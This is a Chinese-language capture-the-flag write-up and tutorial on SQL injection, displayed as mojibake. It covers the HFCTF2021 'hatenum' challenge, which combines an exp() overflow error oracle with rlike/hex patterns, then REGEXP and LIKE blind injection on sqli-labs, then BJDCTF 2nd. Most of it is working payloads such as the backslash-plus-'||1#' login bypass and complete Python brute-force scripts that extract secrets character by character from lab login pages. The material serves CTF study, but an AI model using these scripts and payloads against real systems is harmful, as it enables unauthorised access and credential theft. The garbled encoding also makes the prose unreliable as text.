é‚£æˆ‘ä»¬é‡ç‚¹å…³æ³¨ä¸€ä¸‹sqlè¯­å¥éƒ¨åˆ† $res = $this-&gt;conn-&gt;query(\"select * from users where username='$username' and password='$password'\"); è¿™é‡Œä¼¼ä¹å¯ä»¥æ„é€ ä¸‡èƒ½å¯†ç ï¼Œpayloadä¼¼ä¹ä¸æˆ‘ä¹‹å‰åˆ·çš„é¶åœºæ€è·¯ä¸€è‡´ username=\\ password=||1# select * from users where username='(\\' and password=')||1#' æ‹¬å·å†…å°±æ˜¯usernameçš„å€¼ï¼Œè¿™æ ·çš„è¯å¯ä»¥æˆåŠŸç»•è¿‡ ä½†è¿™é‡Œæœ‰ä¸€ä¸ªéªŒè¯ç codeæ— ä»å¾—çŸ¥ï¼Œåªèƒ½çœ‹wpäº† æ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯æ˜¯ä½¿ç”¨ rlikeï¼ˆå³regexpï¼‰æŒ‰ç…§ä¹‹å‰regexpåŒ¹é…æ³¨å…¥çš„æ–¹æ³•ï¼Œå°† code åŒ¹é…å‡ºæ¥ã€‚æˆ‘ä»¬åˆåœ¨ login å‡½æ•°ä¸­æ³¨æ„åˆ°ï¼š å½“ä½¿ç”¨æ­£åˆ™åŒ¹é…æ—¶ï¼Œä½¿ç”¨REGEXPå’ŒNOT REGEXPæ“ä½œç¬¦(æˆ–RLIKEå’ŒNOT RLIKEï¼ŒåŠŸèƒ½æ˜¯ä¸€æ ·çš„) LIKEè¦å…¨éƒ¨åŒ¹é…æ‰è¿”å›1ï¼Œè€ŒRLIKEå’ŒREGEXPåˆ™æ˜¯éƒ¨åˆ†åŒ¹é…å³å¯è¿”å›1ã€‚ mysql&gt; select 'abcd' like 'a'; +-----------------+ | 'abcd' like 'a' | +-----------------+ | 0 | +-----------------+ 1 row in set (0.04 sec) mysql&gt; select 'abcd' rlike 'a'; +------------------+ | 'abcd' rlike 'a' | +------------------+ | 1 | +------------------+ 1 row in set (0.03 sec) mysql&gt; select 'abcd' regexp 'a'; +-------------------+ | 'abcd' regexp 'a' | +-------------------+ | 1 | +-------------------+ 1 row in set (0.04 sec) ï¼ˆå¥½å¥½å¥½ï¼Œåˆå¾—å­¦ä¹ ä¸€æ³¢regexpæ³¨å…¥äº†~~~~ï¼‰ if($this-&gt;conn-&gt;error){ // å¦‚æœsqlè¯­å¥æŠ¥é”™å°±è¿”å›error return 'error'; } å¦‚æœ sql è¯­å¥å‡ºç°é”™è¯¯ä¾¿è¿”å›å­—ç¬¦ä¸² â€œerrorâ€ï¼Œç„¶åè¿›å…¥åˆ° login.php ä¸­å°±ä¼šè¿”å› errorã€‚æ ¹æ®è¿™é‡Œçš„ç‰¹æ€§ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶è¿™é‡Œçš„æŠ¥é”™çš„è¯ï¼Œä¾¿å¯ä»¥è¿›è¡Œç›²æ³¨ã€‚ ä½†æ˜¯æ€ä¹ˆæ„é€ å‘¢ï¼Ÿåœ¨ç½‘ä¸Šçš„çœ‹åˆ°äº†å¤§ä½¬çš„æ€è·¯æ˜¯çœŸçš„å·§å¦™ï¼š ||exp(710-(... rlike ...)) å³å¦‚æœ (... rlike ...) ä¸­çš„è¯­å¥æ‰§è¡ŒåŒ¹é…åçš„ç»“æœä¸ºTrueï¼Œç»è¿‡å‡å·è½¬æ¢åä¸º exp(710-1) åä¸ä¼šæº¢å‡ºï¼›è‹¥ä¸ºfalseï¼Œè½¬æ¢ä¸º exp(710-0) ååˆ™ä¼šæº¢å‡ºå¹¶æŠ¥é”™ã€‚ å¤§è‡´çš„ payload å¦‚ä¸‹ï¼š 'username': 'admin\\', 'password': '||exp(710-(code rlike binary {0}))#', 'code': '1' å¯¹äºä¸Šè¿°payloadçš„è§£é‡Šï¼ˆGPTï¼‰ï¼š select (select database()) regexp binary '^sec' ä¾‹å­å¦‚ä¸Šï¼Œè§£é‡Šå¦‚ä¸‹ï¼Œå¤§æ¦‚binaryå…³é”®å­—å°±æ˜¯ç”¨æ¥åŒºåˆ†å¤§å°å†™çš„å§ è¿™æ®µ SQL è¯­å¥å¯ä»¥åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œè®©æˆ‘ä¸€æ­¥ä¸€æ­¥è§£é‡Šï¼š 1. `(select database())`ï¼šè¿™éƒ¨åˆ†æ‰§è¡Œä¸€ä¸ªå­æŸ¥è¯¢ï¼Œè·å–å½“å‰æ•°æ®åº“çš„åç§°ã€‚ 2. `regexp binary '^sec'`ï¼šè¿™éƒ¨åˆ†ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ï¼Œå¹¶ä¸”ä½¿ç”¨ `binary` è¿›è¡ŒäºŒè¿›åˆ¶æ¯”è¾ƒã€‚ - `regexp` æ˜¯ MySQL ä¸­ç”¨äºæ‰§è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„æ“ä½œç¬¦ã€‚ - `binary` æ˜¯ä¸€ä¸ªä¿®é¥°ç¬¦ï¼Œç”¨äºè¡¨ç¤ºè¦è¿›è¡ŒäºŒè¿›åˆ¶æ¯”è¾ƒã€‚åœ¨è¿™ä¸ªä¸Šä¸‹æ–‡ä¸­ï¼Œå®ƒç¡®ä¿æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…æ˜¯å¯¹å­—èŠ‚è¿›è¡Œç²¾ç¡®åŒ¹é…ï¼Œè€Œä¸è€ƒè™‘å­—ç¬¦çš„å¤§å°å†™æˆ–ç¼–ç ã€‚ - `'^sec'` æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ï¼Œè¡¨ç¤ºä»¥ \"sec\" å¼€å¤´çš„å­—ç¬¦ä¸²ã€‚ ç»¼åˆèµ·æ¥ï¼Œæ•´ä¸ª SQL è¯­å¥çš„å«ä¹‰æ˜¯ï¼šæ£€æŸ¥å½“å‰æ•°æ®åº“çš„åç§°æ˜¯å¦ä»¥ \"sec\" å¼€å¤´ã€‚å¦‚æœåŒ¹é…æˆåŠŸï¼ŒæŸ¥è¯¢å°†è¿”å› 1ï¼Œè¡¨ç¤ºçœŸï¼ˆtrueï¼‰ï¼›å¦åˆ™ï¼Œè¿”å› 0ï¼Œè¡¨ç¤ºå‡ï¼ˆfalseï¼‰ã€‚ ä½†è¿™é‡Œé¢˜ç›®è¿‡æ»¤äº†å¼•å·ï¼Œæ‰€ä»¥æˆ‘ä»¬rlikeæ— æ³•ç›´æ¥å¼•å…¥%å’Œ^ã€‚æŒ‰ç…§ä¹‹å‰çš„regexpæ³¨å…¥æ“ä½œæˆ‘ä»¬å¯ä»¥å°†^è¿åŒåé¢çš„å¾…çŒœæµ‹å­—ç¬¦ä¸€å—åšHexç¼–ç ï¼Œä¹‹åè¿›å…¥æ•°æ®åº“ä¸­MySQLä¼šè‡ªåŠ¨å°†16è¿›åˆ¶ç¼–ç çš„å­—ç¬¦è½¬ä¸ºå¯¹åº”çš„å­—ç¬¦ä¸² def str2hex(string): # è½¬æ¢16è¿›åˆ¶,16è¿›åˆ¶åœ¨æ•°æ®åº“æ‰§è¡ŒæŸ¥è¯¢æ—¶åˆé»˜è®¤è½¬æ¢æˆå­—ç¬¦ä¸² result = '' for i in string: result += hex(ord(i)) result = result.replace('0x', '') return '0x' + result ...... passwd = str2hex('^' + name + j) payloads = payload.format(passwd).replace(' ',chr(0x0c)) postdata = { 'username': 'admin\\\\', 'password': payloads, 'code': '1' } é¢˜ç›®è¿˜é™åˆ¶äº† password ä½ç½®åŒ¹é…çš„å­—ç¬¦ä¸²é•¿åº¦ï¼Œæœ€é•¿åªèƒ½åŒ¹é… 4 ä¸ªå­—ç¬¦ï¼Œå¦‚æœè¶…è¿‡äº† 4 ä¸ªåˆ™ä¼šè¿”å› Huge num detected é”™è¯¯ï¼ˆä½†æˆ‘ä¸çŸ¥é“ä¸ºä½•å¸ˆå‚…ä»¬éƒ½è¯´æœ€å¤šåªèƒ½4ä¸ªå­—ç¬¦ï¼Œæˆ‘çœ‹ç€æ­£åˆ™å½“ä¸­æ˜¯æ•°å­—9ï¼Œä¸åº”è¯¥æ˜¯9ä¸ªå­—ç¬¦å—ã€‚ã€‚ä¸ç†è§£ï¼‰ã€‚ æ¥ç€æˆ‘å¹¸è¿åœ°æ‰¾åˆ°äº†ä¸€ä¸ªè§£é‡Šï¼š åŒæ—¶num_waf æœ‰ä¸ªåˆ¤æ–­åå…­è¿›åˆ¶ä½æ•°ä¸èƒ½è¶…è¿‡9ä½ï¼Œæ—¢å­—ç¬¦ä¸²ä¸èƒ½è¶…è¿‡4ä½(ä¸€ä¸ªå­—æ¯å¯¹åº”2ä¸ªåå…­è¿›åˆ¶æ•°)ï¼Œæ‰€ä»¥åœ¨åŒ…å«æ­£åˆ™^ä»¥å¤–çš„å­—ç¬¦ä¸²è¶…è¿‡3ä½æ—¶éœ€è¦ä¸æ–­åšæ›¿æ¢ï¼Œç”¨3ä½å­—ç¬¦ä¸²å»åŒ¹é…ä¸‹ä¸€ä½ é‚£è¿™æ ·çš„è¯æˆ‘ä»¬ä¾¿ä¸èƒ½åœ¨ payload é‡Œé¢ä½¿ç”¨ ^ äº†ï¼Œä¹Ÿå°±æ²¡æœ‰åŠæ³•åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ç¡®å®šé¦–ä½çš„ä½ç½®ï¼Œæˆ‘ä»¬åªèƒ½çŸ¥é“æœ‰è¿™ä¹ˆå‡ ä¸ªè¿ç»­çš„å­—ç¬¦ï¼Œå°±åƒä¸‹é¢è¿™æ ·ï¼š mysql&gt; select 'flag{abcdefghijklmnopqrstuvwxyz}' rlike 'ab'; +-----------------------------------------------+ | 'flag{abcdefghijklmnopqrstuvwxyz}' rlike 'ab' | +-----------------------------------------------+ | 1 | +-----------------------------------------------+ 1 row in set (0.04 sec) mysql&gt; select 'flag{abcdefghijklmnopqrstuvwxyz}' rlike 'lag{'; +-------------------------------------------------+ | 'flag{abcdefghijklmnopqrstuvwxyz}' rlike 'lag{' | +-------------------------------------------------+ | 1 | +-------------------------------------------------+ 1 row in set (0.03 sec) å¸ˆå‚…çš„çˆ†ç ´æ€è·¯ï¼šå…ˆçˆ†ç ´å‡ºå‰ä¸‰ä½æ¥ï¼Œç„¶åå†é€šè¿‡å‰ 3 ä½çˆ†ç¬¬4ä½ï¼Œå†é€šè¿‡ç¬¬2ã€3ã€4ä½çˆ†ç¬¬5ä½â€¦ ç¼–å†™å¦‚ä¸‹è„šæœ¬è¿›è¡Œçˆ†ç ´ï¼š import requests import string def str2hex(string): # è½¬æ¢16è¿›åˆ¶,16è¿›åˆ¶åœ¨æ•°æ®åº“æ‰§è¡ŒæŸ¥è¯¢æ—¶åˆé»˜è®¤è½¬æ¢æˆå­—ç¬¦ä¸² result = '' for i in string: result += hex(ord(i)) result = result.replace('0x', '') return '0x' + result strs = string.ascii_letters + string.digits + '_' url = \"http://690399e6-ab28-459d-ab40-789da08843fb.node4.buuoj.cn:81/login.php\" headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' } payload = '||exp(710-(code rlike binary {0}))#' if __name__ == \"__main__\": name = '' z = 3 for i in range(1, 40): for j in strs: passwd = str2hex(name + j) payloads = payload.format(passwd).replace(' ',chr(0x0c))#0x0cä»£æ›¿ç©ºæ ¼ postdata = { 'username': 'admin\\\\', 'password': payloads, 'code': '1' } r = requests.post(url, data=postdata, headers=headers, allow_redirects=False) #print(r.text) if \"fail\" in r.text: name += j print(j, end='') break if len(name) &gt;= 3: for i in range(1, 40): for j in strs: passwd = str2hex(name[z - 3:z] + j) # ergh payloads = payload.format(passwd).replace(' ', chr(0x0c)) postdata = { 'username': 'admin\\\\', 'password': payloads, 'code': '1' } r = requests.post(url, data=postdata, headers=headers, allow_redirects=False) # print(r.text) if \"fail\" in r.text: name += j print(j, end='') z += 1 break å‡ºç»“æœäº†ï¼Œåˆ«é«˜å…´çš„å¤ªæ—©ï¼Œå› ä¸ºè¿™é‡Œé™·å…¥äº†ä¸€ä¸ªæ­»å¾ªç¯å½“ä¸­ï¼š erghruigh2uygh2uygh2uygh2uygh2uygh2uygh2uygh2uygh2uygh2uygh...... å¯ä»¥çœ‹åˆ°çˆ†å‡º erghruigh2 ä¹‹åä¸åœåœ°å¾ªç¯å‡ºç° uygh2ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ¨æµ‹å‡ºçœŸæ­£çš„ code é‡Œé¢æœ‰ä¸¤ä¸ª gh2ï¼Œå…¶ä¸­ä½äºå‰é¢çš„é‚£ä¸ª gh2 åé¢ç´§è·Ÿç€ä¸€ä¸ª uï¼Œå³ gh2uã€‚åé¢é‚£ä¸ª gh2 åé¢è·Ÿçš„æ˜¯é‚£ä¸ªå­—ç¬¦æˆ‘ä»¬è¿˜ä¸èƒ½ç¡®å®šï¼Œé‚£æˆ‘ä»¬ä¾¿å¯ä»¥æµ‹è¯•ä¸€ä¸‹é™¤äº† u ä»¥å¤–çš„å…¶ä»–å­—ç¬¦ï¼Œç»æµ‹è¯•ç¬¬äºŒä¸ª gh2 åé¢è·Ÿçš„å­—ç¬¦æ˜¯ 3ï¼Œå³ gh23ï¼Œç„¶åç»§ç»­æ ¹æ® h23 çˆ†ç ´æ¥ä¸‹æ¥çš„å­—ç¬¦å°±è¡Œäº†ï¼Œæœ€åå¾—åˆ°çš„ code å¦‚ä¸‹ï¼š erghruigh2uygh23uiu32ig ä¸è¿‡è¿™é‡Œæˆ‘ä¹Ÿæ˜¯æƒ³ä¸é€šæœ€åè¿™ä¸ªæ­»å¾ªç¯çš„è§£å†³åŸç†ã€‚ã€‚ã€‚ ç„¶åç›´æ¥ç™»é™†å³å¯å¾—åˆ° flagï¼š æ¥ç€æˆ‘åˆæ‰¾äº†å‡ ç¯‡wpå‘ç°æœ‰ä½å¸ˆå‚…ç›´æ¥ä»æœ€åä¸€ä¸ªå­—ç¬¦å¼€å§‹åŒ¹é…ï¼Œç”¨åˆ°äº†$æ­£åˆ™ï¼š $ æ˜¯ä¸€ä¸ªç”¨äºé”šå®šæ¨¡å¼ç»“å°¾ä½ç½®çš„å…ƒå­—ç¬¦ï¼Œç”¨äºç¡®ä¿åŒ¹é…å‘ç”Ÿåœ¨è¾“å…¥å­—ç¬¦ä¸²çš„æœ«å°¾ã€‚ è¿™æ ·å°±ä¸ä¼šæœ‰ä¸Šè¿°é‡å¤çš„é—®é¢˜ï¼Œä½†æ˜¯ä¹Ÿè¦é…åˆä»ç¬¬ä¸€ä½å¼€å§‹çˆ†ç ´çš„è„šæœ¬ï¼Œè¿™æ ·ä¸¤è€…å¯¹æ¯”æ‰å¯æ­£ç¡®å¾—å‡º import requests import string def str2hex(string): # è½¬æ¢16è¿›åˆ¶,16è¿›åˆ¶åœ¨æ•°æ®åº“æ‰§è¡ŒæŸ¥è¯¢æ—¶åˆé»˜è®¤è½¬æ¢æˆå­—ç¬¦ä¸² result = '' for i in string: result += hex(ord(i)) result = result.replace('0x', '') return '0x' + result strs = string.ascii_letters + string.digits + '_' url = \"http://690399e6-ab28-459d-ab40-789da08843fb.node4.buuoj.cn:81/login.php\" headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' } payload = '||exp(710-(code rlike binary {0}))#' tmp = '$' if __name__ == \"__main__\": name = '' z = 3 for i in range(1, 40): for j in strs: passwd = str2hex(j + tmp) payloads = payload.format(passwd).replace(' ',chr(0x0c)) postdata = { 'username': 'admin\\\\', 'password': payloads, 'code': '1' } r = requests.post(url, data=postdata, headers=headers, allow_redirects=False) #print(r.text) if \"fail\" in r.text: name += j print(j + tmp, name) if len(tmp) == 3: tmp = j + tmp[:-1] else: tmp = j + tmp break å¦‚ä¸Šå›¾ï¼Œæœ€åç®€å•åè½¬ä¸€ä¸‹å­—ç¬¦ä¸²å³å¯ æœ€åä¼šæœ‰å¦‚ä¸‹ï¼š erghruigh2uygh2uygh2uygh2uygh2 erghruigh23uiu32ig æˆ‘ä»¬ä¸¤è€…å¯¹æ¯”å¾—åˆ°erghruigh2uygh23uiu32ig åªèƒ½è¯´è„šæœ¬å¯¹æˆ‘æ¥è¯´å¥½éš¾ã€‚ã€‚ã€‚æ¥ä¸‹æ¥å°±æ˜¯è·Ÿç€ç¼–å†™è„šæœ¬çš„æ—¶å€™äº† import requests import string def str2hex(str): result = '' for i in str: result += hex(ord(i)) result = result.replace('0x', '') return '0x' + result strs = string.ascii_letters + string.digits + '_' url = 'http://690399e6-ab28-459d-ab40-789da08843fb.node4.buuoj.cn:81/login.php' headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' } payload = '||exp(710-(code rlike binary {0}))#' tmp = '^' name = '' for i in range(1, 40): for j in strs: passwd = str2hex(tmp + j) payloads = payload.format(passwd).replace(' ', chr(0x0c)) data = { 'username': '\\\\', 'password': payloads, 'code': '1' } req = requests.post(url, data = data, allow_redirects=False) if 'fail' in req.text: name += j print(tmp + j, name) if len(tmp) == 3: tmp = tmp[1:] + j else: tmp += j break tmp = '$' name = '' for i in range(1, 40): for j in strs: passwd = str2hex(j + tmp) payloads = payload.format(passwd).replace(' ', chr(0x0c)) data = { 'username': '\\\\', 'password': payloads, 'code': '1' } req = requests.post(url, data = data, allow_redirects=False) if 'fail' in req.text: name = j + name print(j + tmp, name) if len(tmp) == 3: tmp = j + tmp[:-1] else: tmp = j + tmp break data = { 'username': '\\\\', 'password': '||1#', 'code': 'erghruigh2uygh23uiu32ig' } req = requests.post(url, data=data) print(req.text) å®Œæ•´ä»£ç å¦‚ä¸Šï¼Œä¸è¿‡æˆ‘è‡ªå·±åœ¨ç¼–å†™å®Œæˆåï¼Œå‘ç°ä»åé¢å¼€å§‹åŒ¹é…çš„æ–¹æ³•ï¼Œæœ‰ä¸€å®šå‡ ç‡ä¸€æ¬¡æˆåŠŸã€‚ 0x04 REGEXPä¸LIKEæ³¨å…¥ è¿™é‡Œè´¨é‡ä½ä¸‹ï¼ŒçŸ¥è¯†ç‚¹åŸºæœ¬éƒ½æ˜¯ç…§æ¬çš„ï¼Œæœ‰çš„åªæ˜¯è‡ªå·±çš„æ€è€ƒå’Œå®æ“ç½¢äº† REGEXPæ³¨å…¥åˆ†æ æ³¨å…¥åŸç† REGEXPæ³¨å…¥ï¼Œå³regexpæ­£åˆ™è¡¨è¾¾å¼æ³¨å…¥ã€‚REGEXPæ³¨å…¥ï¼Œåˆå«ç›²æ³¨å€¼æ­£åˆ™è¡¨è¾¾å¼æ”»å‡»ã€‚åº”ç”¨åœºæ™¯å°±æ˜¯ç›²æ³¨ï¼ŒåŸç†æ˜¯ç›´æ¥æŸ¥è¯¢è‡ªå·±éœ€è¦çš„æ•°æ®ï¼Œç„¶åé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ã€‚ 1ã€åŸºæœ¬æ³¨å…¥ select (selectè¯­å¥) regexp 'æ­£åˆ™' æ­£å¸¸çš„æŸ¥è¯¢è¯­å¥ï¼š select username from users where id=1; ï¼ˆ1ï¼‰æ­£åˆ™æ³¨å…¥ï¼Œè‹¥åŒ¹é…åˆ™è¿”å›1ï¼Œä¸åŒ¹é…è¿”å›0 select (select username from users where id=1) regexp '^a'; mysql&gt; select username from users where id=1; +----------+ | username | +----------+ | Dumb | +----------+ 1 row in set (0.11 sec) mysql&gt; select(select username from users where id=1) regexp '^D'; +-----------------------------------------------------+ | (select username from users where id=1) regexp '^D' | +-----------------------------------------------------+ | 1 | +-----------------------------------------------------+ 1 row in set (0.04 sec) mysql&gt; select(select username from users where id=1) regexp '^a'; +-----------------------------------------------------+ | (select username from users where id=1) regexp '^a' | +-----------------------------------------------------+ | 0 | +-----------------------------------------------------+ 1 row in set (0.04 sec) ^è¡¨ç¤ºpattern(æ¨¡å¼ä¸²)çš„å¼€å¤´ã€‚å³è‹¥åŒ¹é…åˆ°usernameå­—æ®µä¸‹id=1çš„æ•°æ®å¼€å¤´ä¸ºaï¼Œåˆ™è¿”å›1ï¼›å¦åˆ™è¿”å›0 ï¼ˆ2ï¼‰regexpå…³é”®å­—è¿˜å¯ä»¥ä»£æ›¿whereæ¡ä»¶é‡Œçš„=å· mysql&gt; select password from users where id=1; +----------+ | password | +----------+ | Dumb | +----------+ 1 row in set (0.05 sec) mysql&gt; select * from users where password regexp '^Du'; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 1 | Dumb | Dumb | | 12 | dhakkan | dumbo | +----+----------+----------+ 2 rows in set (0.04 sec) ä½¿ç”¨åœºæ™¯ï¼š è¿‡æ»¤äº†=ã€inã€like ^è‹¥è¢«è¿‡æ»¤ï¼Œå¯ä½¿ç”¨$æ¥ä»åå¾€å‰è¿›è¡ŒåŒ¹é…ï¼ˆæ·±æœ‰æ„Ÿæ‚Ÿå•Š~~ï¼‰ï¼Œå¸¸ç”¨regexpæ­£åˆ™è¯­å¥ï¼š regexp '^[a-z]' #åˆ¤æ–­ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åœ¨a-zä¸­ regexp '^r' #åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ºr regexp '^r[a-z]' #åˆ¤æ–­ä¸€ä¸ªè¡¨çš„ç¬¬äºŒä¸ªå­—ç¬¦ä¸²æ˜¯å¦åœ¨a-zä¸­ ï¼ˆ3ï¼‰åœ¨è”åˆæŸ¥è¯¢ä¸­çš„ä½¿ç”¨ 1 union select 1,database() regexp '^s',3--+ ä¸Šè¿°passwordå¤„åªä¼šæ˜¾ç¤º1æˆ–è€…0ï¼Œè¿™æ ·å°±èƒ½çŸ¥é“æˆ‘ä»¬çš„regexpæ˜¯å¦åŒ¹é…æˆåŠŸã€‚ 2ã€REGEXPç›²æ³¨ åœ¨sqli-labsé¶åœºLess-8å…³è¿›è¡Œæµ‹è¯• 1.åˆ¤æ–­æ•°æ®åº“é•¿åº¦ ' or (length(database())=8)--+ æ­£å¸¸ 2.åˆ¤æ–­æ•°æ®åº“å ' or database() regexp '^s'--+ æ­£å¸¸ ' or database() regexp 'y$'--+ æ­£å¸¸ è¡¨åã€å­—æ®µåã€æ•°æ®å†…å®¹ä¸å†èµ˜è¿°ã€‚å¾ˆæ˜æ˜¾å’Œæ™®é€šçš„å¸ƒå°”ç›²æ³¨å·®ä¸å¤šï¼Œé™„ä¸Šå¤§å¸ˆå‚…çš„è„šæœ¬ï¼š import requests import string strs = string.printable url = \"http://x.x.x.x:8001/Less-8/index.php?id=\" database1 = \"' or database() regexp '^{}'--+\" table1 = \"' or (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp '^{}'--+\" cloumn1 = \"' or (select column_name from information_schema.columns where table_name=\\\"users\\\" and table_schema=database() limit 1,1) regexp '^{}'--+\" data1 = \"' or (select username from users limit 0,1) regexp '^{}'--+\" payload = database1 if __name__ == \"__main__\": name = '' for i in range(1,40): char = '' for j in strs: payloads = payload.format(name+j) urls = url+payloads r = requests.get(urls) if \"You are in\" in r.text: name += j print(j,end='') char = j break if char =='#': break LIKEæ³¨å…¥åˆ†æ likeåŒ¹é… ç™¾åˆ†æ¯”(%)é€šé…ç¬¦å…è®¸åŒ¹é…ä»»ä½•å­—ç¬¦ä¸²çš„é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚ä¸‹åˆ’çº¿_é€šé…ç¬¦å…è®¸åŒ¹é…ä»»ä½•å•ä¸ªå­—ç¬¦ã€‚ 1ã€åŸºæœ¬æ³¨å…¥ 1.like 's%'åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ä¸ºs 1 union select 1,database() like 's%',3 --+ 2.like 'se%'åˆ¤æ–­å‰é¢ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ºse 1 union select 1,database() like 'se%',3 --+ 3.like '%se%' åˆ¤æ–­æ˜¯å¦åŒ…å«seä¸¤ä¸ªå­—ç¬¦ä¸² --ä¸è¿‡æµ‹è¯•ä¸‹æ¥å‘ç°å¾…æµ‹å­—ç¬¦çš„å¼€å¤´ä¸€å®šè¦ä¸ºæ­£ç¡®çš„ï¼Œå¦åˆ™é¡µé¢ä¸€ç›´è¿”å›0ï¼Œä¹Ÿå°±æ˜¯æ— æ³•åŒ¹é…ç±»ä¼¼%ecu%è¿™ç±»å­—ç¬¦ 1 union select 1,database() like '%se%',3 --+ 4.like '_____'åˆ¤æ–­æ˜¯å¦ä¸º5ä¸ªå­—ç¬¦ 1 union select 1,database() like '_____',3 --+ 5.like 's____' åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ä¸ºs 1 union select 1,database() like 's____',3 --+ 2ã€LIKEç›²æ³¨ ä¾æ—§åœ¨sqli-labsé¶åœºLess-8å…³è¿›è¡Œæµ‹è¯• 1.åˆ¤æ–­æ•°æ®åº“é•¿åº¦ å¯ç”¨length()å‡½æ•°ï¼Œä¹Ÿå¯ç”¨_ï¼Œå¦‚ï¼š ' or database() like '________'--+ 2.åˆ¤æ–­æ•°æ®åº“å ' or database() like 's%'--+ ä¹Ÿå¯ç”¨ ' or database() like 's_______'--+ è¯´æ˜æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯sã€‚æ•°æ®è¡¨ã€å­—æ®µã€æ•°æ®ç±»ä¼¼ï¼ŒæŠŠREGEXPç›²æ³¨è„šæœ¬æ”¹ä¸€ä¸‹ï¼Œäºæ˜¯æˆäº†LIKEç›²æ³¨è„šæœ¬ï¼š import requests import string strs = string.printable url = \"http://x.x.x.x:8001/Less-8/index.php?id=\" database1 = \"' or database() like '{}%'--+\" table1 = \"' or (select table_name from information_schema.tables where table_schema=database() limit 0,1) like '{}%'--+\" cloumn1 = \"' or (select column_name from information_schema.columns where table_name=\\\"users\\\" and table_schema=database() limit 1,1) like '{}%'--+\" data1 = \"' or (select username from users limit 0,1) like '{}%'--+\" payload = database1 if __name__ == \"__main__\": name = '' for i in range(1,40): char = '' for j in strs: payloads = payload.format(name+j) urls = url+payloads r = requests.get(urls) if \"You are in\" in r.text: name += j print(j,end='') char = j break if char =='#': break 3ã€REGEXPæ³¨å…¥å®æˆ˜ BJDCTF 2nd ç®€å•æ³¨å…¥ å‘ç°æç¤º è¿™é‡Œç»™å‡ºäº†sqlè¯­å¥ Only u input the correct password then u can get the flag and p3rh4ps wants a girl friend. select * from users where username='$_POST[\"username\"]' and password='$_POST[\"password\"]'; å¾ˆæ˜æ˜¾åˆæ˜¯ç›¸åŒçš„å¥—è·¯ï¼Œæˆ‘ä»¬è¿›è¡Œå¦‚ä¸‹èµ‹å€¼ï¼š username=haha\\ password='or 1#' select * from users where username='(haha\\' and password=')or 1#'; #æ‹¬å·åªæ˜¯ä¸€ä¸ªæç¤ºä½œç”¨ ç®€å•fuzzä¸€ä¸‹çœ‹ä¸€ä¸‹è¿‡æ»¤æƒ…å†µï¼š è¿‡æ»¤çš„æœ‰ï¼šselectã€unionã€'ã€=ã€likeç­‰ç­‰ ä½†æ˜¯æ²¡è¿‡æ»¤regexp å¦‚ä¸Šå›¾å‘ç°é¡µé¢æœ‰å˜åŒ–ï¼Œæ¥ä¸‹æ¥è¿›ä¸€æ­¥æµ‹è¯• å‘ç°é¡µé¢å›æ˜¾ä¸ä¸€è‡´ï¼Œä½†å§‹ç»ˆåªæœ‰è¿™ä¸¤æ¡ä¿¡æ¯ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬éœ€è¦è¿›è¡Œç›²æ³¨äº†ï¼Œç›´æ¥ä¸Šè„šæœ¬ï¼Œè¿™é‡Œæˆ‘å…ˆå°è¯•è‡ªå·±å†™ä¸€ç•ª import requests import string def str2hex(str): result = '' for i in str: result += hex(ord(i)) result = result.replace('0x', '') return '0x' + result strs = string.ascii_letters + string.digits url = \"http://f973c801-88f4-44ee-9a5c-ec1911041314.node4.buuoj.cn:81/\" payload = 'or password regexp binary {}#' headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' } if __name__ == \"__main__\": name = '' for i in range(1,40): for j in strs: passwd = str2hex('^' + name + j) payloads = payload.format(passwd) data = { 'username': 'admin\\\\', 'password': payloads } r = requests.post(url, data=data,headers=headers) if \"BJD needs\" in r.text: name += j print(j,end='') break æˆåŠŸå¾—åˆ°å¯†ç ï¼Œæˆ‘ä»¬ç™»å½•å³å¯å¾—åˆ°flag 0x05 åè¨€ æœ¬æ¬¡å¯¹äºæŠ¥é”™æ³¨å…¥çš„å­¦ä¹ æœ‰äº›è®¸æ·±åˆ»ï¼Œæ—¥åä¼šéšç¼˜æ›´æ–°è¡¥å……æœ¬æ–‡ï¼Œå¸Œæœ›å¯ä»¥å¯¹æŠ¥é”™æ³¨å…¥æœ‰ä¸€ä¸ªå®Œå…¨çš„æŒæ¡ã€‚ 0x06 å‚è€ƒæ–‡ç«  SQLæŠ¥é”™æ³¨å…¥ï¼ˆä¸‹ï¼‰ å¦‚ä½•ä½¿ç”¨ MySQL exp() å‡½æ•°è¿›è¡Œ Sql æ³¨å…¥ SQL æ˜¾é”™æ³¨å…¥ 2021-è™ç¬¦ç½‘ç»œå®‰å…¨èµ›é“-hatenum | exp()å‡½æ•°ä¸æ­£åˆ™è¿‡æ»¤ [HFCTF2021]hatenum 